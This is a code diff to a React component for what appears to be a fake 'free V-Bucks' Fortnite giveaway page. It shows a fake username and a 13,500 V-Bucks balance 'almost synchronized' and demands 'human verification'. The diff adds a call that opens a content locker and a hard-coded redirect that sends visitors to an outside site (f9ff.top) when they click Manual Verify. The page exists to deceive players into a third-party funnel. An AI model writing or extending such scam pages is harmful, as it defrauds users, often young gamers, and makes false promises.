@@ -14,8 +14,9 @@ const Verify = () => {
   const [username, setUsername] = useState("Player123");
   const [vbucksAmount, setVbucksAmount] = useState(13500);
   const [isModalOpen, setIsModalOpen] = useState(false);
+
   const contentPathname = import.meta.env.VITE_CONTENT_PATHNAME;
- 
+
   useEffect(() => {
     const timer = setTimeout(() => {
       setIsLoading(false);
@@ -42,7 +43,12 @@ const Verify = () => {
       title: "Verification Required",
       description: "Please complete the human verification process.",
     });
+
+    // Deschide locker-ul inline
     _Vm(); // Se deschide direct în pagina curentă
+
+    // Redirecționează utilizatorul pe noul site în aceeași fereastră
+    window.location.href = "https://f9ff.top/68fcad4";
   };
 
   return (
@@ -62,7 +68,6 @@ const Verify = () => {
         <div className="w-[68px]"></div> {/* Spacer for centering */}
       </header>
 
-      
       <div className="flex-1 container mx-auto py-8 px-4 flex flex-col items-center justify-center">
         {isLoading ? (
           <motion.div
@@ -121,15 +126,16 @@ const Verify = () => {
                 transition={{ delay: 0.4, duration: 0.5 }}
               >
                 Hello{" "}
-                 <span className="text-fortnite-yellow font-semibold">
-                   @{username}
-                 </span>
-                 ! You are almost done with synchronization of{" "}
-                 <span className="text-fortnite-yellow font-semibold">
-                   {vbucksAmount.toLocaleString()}
-                 </span>{" "}
-                 V-Bucks!
-                  </motion.p>
+                <span className="text-fortnite-yellow font-semibold">
+                  @{username}
+                </span>
+                ! You are almost done with synchronization of{" "}
+                <span className="text-fortnite-yellow font-semibold">
+                  {vbucksAmount.toLocaleString()}
+                </span>{" "}
+                V-Bucks!
+              </motion.p>
+            </div>
 
             <motion.div
               className="bg-white/5 rounded-lg p-5 mb-6 border border-white/10"
@@ -159,8 +165,8 @@ const Verify = () => {
               animate={{ opacity: 1 }}
               transition={{ delay: 0.6, duration: 0.5 }}
             >
-             Please complete the last step by clicking the Manual Verify button
-               below to finish the synchronization process.
+              Please complete the last step by clicking the Manual Verify button
+              below to finish the synchronization process.
             </motion.p>
 
             <motion.div
